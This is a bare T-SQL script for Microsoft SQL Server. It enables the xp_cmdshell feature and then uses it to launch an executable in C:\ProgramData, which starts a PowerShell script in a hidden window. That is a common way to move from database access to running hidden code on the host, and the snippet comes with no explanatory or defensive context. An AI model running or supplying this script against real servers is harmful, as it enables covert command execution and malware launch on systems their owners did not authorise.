EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE
GO
DECLARE @c VARCHAR(8000)
SET @c = 'C:\ProgramData\x.exe -c "pwsh -WindowStyle Hidden -File C:\ProgramData\run.ps1"'
EXECUTE [master].[dbo].[xp_cmdshell] @c
